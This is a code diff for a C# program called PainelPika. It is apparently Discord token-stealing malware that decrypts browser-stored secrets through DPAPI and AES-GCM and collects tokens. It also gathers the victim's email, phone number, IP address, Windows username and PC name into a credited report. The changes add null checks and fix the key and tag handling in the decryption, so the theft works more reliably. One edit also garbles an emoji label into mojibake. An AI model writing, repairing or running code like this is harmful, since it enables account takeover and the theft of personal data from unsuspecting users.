@@ -99,7 +99,12 @@ namespace PainelPika
                 UseShellExecute = false,
                 CreateNoWindow = true
             };
-            using (Process process = Process.Start(psi))
+            Process? process = Process.Start(psi);
+            if (process == null)
+            {
+                return "";
+            }
+            using (process)
             {
                 string output = process.StandardOutput.ReadToEnd();
                 output += process.StandardError.ReadToEnd();
@@ -136,8 +141,12 @@ namespace PainelPika
         }
 
         // Base64 decode
-        private static byte[] Base64Decode(string input)
+        private static byte[] Base64Decode(string? input)
         {
+            if (string.IsNullOrEmpty(input))
+            {
+                return Array.Empty<byte>();
+            }
             return Convert.FromBase64String(input);
         }
 
@@ -161,19 +170,16 @@ namespace PainelPika
                 DATA_BLOB output = new DATA_BLOB();
                 if (CryptUnprotectData(ref input, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref output))
                 {
-                    using (AesGcm aesGcm = new AesGcm(output.pbData + 1, output.cbData - 1)) // Assuming key is from offset 1
+                    byte[] unprotectedKey = new byte[output.cbData];
+                    Marshal.Copy(output.pbData, unprotectedKey, 0, (int)output.cbData);
+                    using (AesGcm aesGcm = new AesGcm(unprotectedKey))
                     {
                         byte[] nonce = new byte[12];
                         Array.Copy(cipher, 3, nonce, 0, 12);
-                        byte[] ciphertext = new byte[cipher.Length - 15];
+                        byte[] ciphertext = new byte[cipher.Length - 31];
                         Array.Copy(cipher, 15, ciphertext, 0, ciphertext.Length);
-                        byte[] tag = new byte[16]; // GCM tag is 16 bytes, but original code doesn't explicitly handle tag?
-
-                        // Note: Original C++ code uses EVP_Decrypt with GCM but seems to assume tag is included or handled implicitly.
-                        // In .NET AesGcm, we need to provide tag separately. Assuming last 16 bytes of cipher are tag.
+                        byte[] tag = new byte[16];
                         Array.Copy(cipher, cipher.Length - 16, tag, 0, 16);
-                        ciphertext = new byte[cipher.Length - 15 - 16]; // Adjust if needed
-                        Array.Copy(cipher, 15, ciphertext, 0, ciphertext.Length);
 
                         byte[] plaintext = new byte[ciphertext.Length];
                         aesGcm.Decrypt(nonce, ciphertext, tag, plaintext);
@@ -243,7 +249,8 @@ namespace PainelPika
                 if (!local_state.TryGetProperty("os_crypt", out JsonElement os_crypt) ||
                     !os_crypt.TryGetProperty("encrypted_key", out JsonElement encrypted_key_elem)) continue;
 
-                string encrypted_key_str = encrypted_key_elem.GetString();
+                string? encrypted_key_str = encrypted_key_elem.GetString();
+                if (encrypted_key_str == null) continue;
                 byte[] encrypted_key = Base64Decode(encrypted_key_str);
                 byte[] master_key = new byte[encrypted_key.Length - 5];
                 Array.Copy(encrypted_key, 5, master_key, 0, master_key.Length);
@@ -258,7 +265,10 @@ namespace PainelPika
                     MatchCollection matches = Regex.Matches(file_content, regex_pattern);
                     foreach (Match match in matches)
                     {
-                        tokens.Add(match.Value);
+                        if (match.Value != null)
+                        {
+                            tokens.Add(match.Value);
+                        }
                     }
                 }
 
@@ -305,10 +315,12 @@ namespace PainelPika
                         string ip = await GetIPAsync();
                         string pc_username = GetEnvVar("UserName");
                         string pc_name = GetEnvVar("COMPUTERNAME");
-                        string user_name = res_json.GetProperty("username").GetString() + "#" + res_json.GetProperty("discriminator").GetString();
-                        string user_id = res_json.GetProperty("id").GetString();
-                        string email = res_json.GetProperty("email").GetString();
-                        string phone = res_json.TryGetProperty("phone", out JsonElement phoneElem) && !phoneElem.ValueKind.Equals(JsonValueKind.Null) ? phoneElem.GetString() : "None";
+                        string? user_name_disc = res_json.GetProperty("username").GetString();
+                        string? discriminator = res_json.GetProperty("discriminator").GetString();
+                        string user_name = $"{user_name_disc ?? "Unknown"}#{discriminator ?? "0000"}";
+                        string user_id = res_json.GetProperty("id").GetString() ?? "Unknown";
+                        string email = res_json.GetProperty("email").GetString() ?? "None";
+                        string? phone = res_json.TryGetProperty("phone", out JsonElement phoneElem) && phoneElem.ValueKind != JsonValueKind.Null ? phoneElem.GetString() ?? "None" : "None";
                         bool mfa_enabled = res_json.GetProperty("mfa_enabled").GetBoolean();
                         bool has_nitro = false;
                         int days_left = 0;
@@ -323,11 +335,16 @@ namespace PainelPika
                             if (has_nitro)
                             {
                                 JsonElement first = nitro_data[0];
-                                string end = first.GetProperty("current_period_end").GetString().Substring(0, 19);
-                                string start = first.GetProperty("current_period_start").GetString().Substring(0, 19);
-                                DateTime t1 = DateTime.ParseExact(end, "yyyy-MM-ddTHH:mm:ss", null);
-                                DateTime t2 = DateTime.ParseExact(start, "yyyy-MM-ddTHH:mm:ss", null);
-                                days_left = Math.Abs((int)(t1 - t2).TotalDays);
+                                string? end = first.GetProperty("current_period_end").GetString();
+                                string? start = first.GetProperty("current_period_start").GetString();
+                                if (end != null && start != null)
+                                {
+                                    end = end.Substring(0, 19);
+                                    start = start.Substring(0, 19);
+                                    DateTime t1 = DateTime.ParseExact(end, "yyyy-MM-ddTHH:mm:ss", null);
+                                    DateTime t2 = DateTime.ParseExact(start, "yyyy-MM-ddTHH:mm:ss", null);
+                                    days_left = Math.Abs((int)(t1 - t2).TotalDays);
+                                }
                             }
                         }
 
@@ -344,7 +361,7 @@ namespace PainelPika
                              .Append("\tUsername: ").Append(pc_username).Append("\n")
                              .Append("\tPC Name: ").Append(pc_name).Append("\n")
                              .Append("\tPlatform: ").Append(GetWindowsVersion()).Append("\n")
-                             .Append(":piñata: Token\n")
+                             .Append(":piÃ±ata: Token\n")
                              .Append("\t").Append(tok).Append("\n")
                              .Append("Made by Astraa#6100 | ||https://github.com/astraadev||");
 
